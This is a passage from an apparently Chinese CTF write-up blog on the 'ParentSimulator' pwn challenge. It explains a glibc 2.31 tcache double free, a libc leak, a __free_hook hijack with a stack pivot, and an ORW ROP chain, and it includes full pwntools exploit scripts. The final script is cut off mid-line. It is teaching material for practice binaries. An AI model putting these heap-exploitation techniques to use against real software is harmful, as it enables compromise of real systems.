rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0xCE1)&quot;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;set:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(offset))</span><br><span class="line">payload = p64(onegadget) + p64(realloc+<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:\n&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ParentSimulator"><a href="#ParentSimulator" class="headerlink" title="ParentSimulator"></a>ParentSimulator</h2><p>检测启动用户是否为 root ，hook getuid 返回值为 0 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#filename:hook.c</span></span><br><span class="line"><span class="meta">#gcc -shared -fPIC hook.c -o hook.so</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+]hook&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210401004936.png" alt="image-20210329203019415"></p><p>Glibc 2.31 版本下的 UAF ，堆 size 固定为 0x100 </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210330002855.png" alt="image-20210330002854352"></p><p>从 glibc 2.29 开始就在 tcache 新增了 key 用于防止 double free 。题中堆块释放后，只有调用 <code>sub_196B()</code> 的一次机会修改位于 bin 中堆块内容。</p><p>程序要用 root 账户运行，可以 peatch 跳转汇编指令，我是 hook <code>getuid</code> 返回值为 0 ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#filename:hook.c</span></span><br><span class="line"><span class="meta">#gcc -fPIC hook.c -o hook.so</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hook&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./hook.so&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="libc-gadget"><a href="#libc-gadget" class="headerlink" title="libc gadget"></a>libc gadget</h3><p>用 <code>666</code> 选项操作一个在 tcache 的堆，泄露出 tcache_struct 地址（堆地址），同时修改 key 实现 tcache double free </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210331101756.png" alt="image-20210331101754705"></p><p>申请两次，获得指向同一块内存的指针。释放其中一个到 unsortedbin ，show 另外一个泄露出 libc 地址</p><p>程序开了沙盒禁止 <code>execve</code> ，之前学过思路是劫持 free_hook 为 setcontext+53 ，设置寄存器构造出一个 read 输入，输入 orw ropchain 并跳转。</p><p>之前 setcontext 做的题目：<a href="https://www.mrskye.cn/archives/223/">https://www.mrskye.cn/archives/223/</a></p><p>从大佬博客学到新姿势，劫持 free_hook 为 libc 的 gadget 栈迁移到堆上的 ropchain </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210331103839.png" alt="image-20210331103838230"></p><p>执行 free_hook rdi 的值是被释放的堆地址，rbp 、 rax 都可以被控制，最后调用 leave_ret 实现栈迁移</p><ul><li>[rax+0x28] ：leave_ret</li><li>[rbp+0x18] ：rax</li><li>[rdi+0x48] ：rbp</li></ul><p>leave_ret 跳转到 rbp 执行 ropchain ，所以 rbp 是 &amp;(ropchain)-8 。gadget 跳转到 ropchain 的部署：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># free(0x5646d3e43e20)</span></span><br><span class="line"><span class="number">0x5646d3e43e20</span>: uncontrol areawrite start at fd_nextsize</span><br><span class="line"><span class="number">0x5646d3e43e30</span>: <span class="string">&quot;/flag&quot;</span>      padding</span><br><span class="line"><span class="number">0x5646d3e43e40</span>: padding      padding</span><br><span class="line"><span class="number">0x5646d3e43e50</span>: padding      padding</span><br><span class="line">0x5646d3e43e60: padding      0x5646d3e43d20(rbp--&gt;ropchain-8)</span><br><span class="line"><span class="number">0x5646d3e43e70</span>: leave_ret      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="comment"># chunk ropchain</span></span><br><span class="line"><span class="number">0x5646d3e43d10</span>: uncontrol areawrite start at fd_nextsize</span><br><span class="line"><span class="number">0x5646d3e43d20</span>: padding      add_rsp_0x18_ret</span><br><span class="line"><span class="number">0x5646d3e43d30</span>: padding      <span class="number">0x00005646d3e43e48</span></span><br><span class="line"><span class="number">0x5646d3e43d40</span>: padding      pop_rdi_ret&lt;==ropchain</span><br><span class="line"><span class="number">0x5646d3e43d50</span>: address of <span class="string">&quot;/flag&quot;</span>      pop_rsi_ret</span><br><span class="line"><span class="number">0x5646d3e43d60</span>: <span class="number">0x0000000000000000</span>      pop_rdx_r12_ret</span><br><span class="line"><span class="number">0x5646d3e43d70</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5646d3e43d80</span>: open_addr      pop_rdi_ret</span><br><span class="line"><span class="number">0x5646d3e43d90</span>: <span class="number">0x0000000000000004</span>      pop_rsi_ret</span><br><span class="line">…………</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># free chunk payload</span></span><br><span class="line">payload=<span class="string">&quot;/flag\x00\x00\x00&quot;</span>.ljust(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(tcache_struct+<span class="number">0xd10</span>) <span class="comment">#ropchunk in chunk6</span></span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ropchain chunk payload </span></span><br><span class="line">payload =p64(<span class="number">0xdeadbeefdeadbeef</span>)+p64(add_rsp_0x18_ret)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeefdeadbeef</span>)+p64(tcache_struct+<span class="number">0xe38</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload+=ropchain</span><br></pre></td></tr></table></figure><h3 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h3><p>Libc 中的 environ 里面存了栈地址，根据偏移可以找到 main rip 的栈地址，然后  hijack rip 为 ropchain</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210401002229.png" alt="image-20210401002227893"></p><p>这题每个堆可控输入位置从 fd_nextsize 开始，tcachebin 填入的地址 -0x10 。这题 main 的 canary 在很上面，即使会修改 rip 前面的 0x10 空间也不会触发 stack_check_fail </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210401004256.png" alt="WX20210401-000729"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><h4 id="libc-gadget-1"><a href="#libc-gadget-1" class="headerlink" title="libc gadget"></a>libc gadget</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, sex, name</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;2.Girl:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(sex))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your child&#x27;s name:\n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your child&#x27;s new name:\n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_description</span>(<span class="params">idx ,desc</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx)) </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your child&#x27;s description:\n&quot;</span>)</span><br><span class="line">    p.send(desc)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./hook.so&quot;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment"># leak heap addr</span></span><br><span class="line">menu(<span class="number">666</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gender:&quot;</span>)</span><br><span class="line">tcache_struct = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;tcache_struct:&quot;</span>+<span class="built_in">hex</span>(tcache_struct))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Girl:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment"># double free tcache</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># full 0x110 tcache</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment"># free 2 unsortedbin</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"><span class="comment"># leak libc_addt</span></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">main_arean = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;main_arean:&quot;</span>+<span class="built_in">hex</span>(main_arean))</span><br><span class="line">libc_base = main_arean - <span class="number">0x1ebbe0</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">open_addr=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts=libc_base+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12_ret=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base+<span class="number">0x000000000005aa48</span></span><br><span class="line">gadget=libc_base+<span class="number">0x157D8A</span><span class="comment">#0x157BFA</span></span><br><span class="line">log.info(<span class="string">&quot;gadget:&quot;</span>+<span class="built_in">hex</span>(gadget))</span><br><span class="line">add_rsp_0x18_ret=libc_base+<span class="number">0x000000000003794a</span></span><br><span class="line">ret=libc_base+<span class="number">0x0000000000025679</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">1</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;d&#x27;</span>)    <span class="comment">#malloc from unsortedbin</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">edit_name(<span class="number">8</span>,p64(free_hook)[:-<span class="number">1</span>])    <span class="comment">#allow read 7 bit</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,p64(gadget)[:-<span class="number">1</span>])   <span class="comment">#allow read 7 bit</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&quot;/flag\x00\x00\x00&quot;</span>.ljust(<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(tcache_struct+<span class="number">0xd10</span>) <span class="comment">#ropchunk in chunk6</span></span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line">edit_description(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">0xdeadbeefdeadbeef</span>)+p64(add_rsp_0x18_ret)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeefdeadbeef</span>)+p64(tcache_struct+<span class="number">0xe38</span>)</span><br><span class="line">payload+=p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(tcache_struct+<span class="number">0xe20</span>)  <span class="comment">#&quot;flag&quot; in chunk0</span></span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload+=p64(open_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">4</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(tcache_struct+<span class="number">0x400</span>)</span><br><span class="line">payload+=p64(pop_rdx_r12_ret)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload+=p64(pop_rdi_ret)</span></span><br><span class="line"><span class="comment"># payload+=p64(tcache_struct+0x400)</span></span><br><span class="line"><span class="comment"># payload+=p64(puts)</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)</span><br><span class="line">payload+=p64(tcache_struct+<span class="number">0x400</span>)</span><br><span class="line">payload+=p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x19D4)&quot;)</span></span><br><span class="line"></span><br><span class="line">edit_description(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="environ-1"><a href="#environ-1" class="headerlink" title="environ"></a>environ</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, sex, name</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;2.Girl:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(sex))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your child&#x27;s name:\n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_name</span>(<span class="params">idx, name</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input your child&#x27;s new name:\n&quot;</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">666</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx)) </span><br><span class="line">    p.recvuntil(<span class="string">&quot;2.Girl:\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_description</span>(<span class="params">idx ,desc</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Please input index?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span 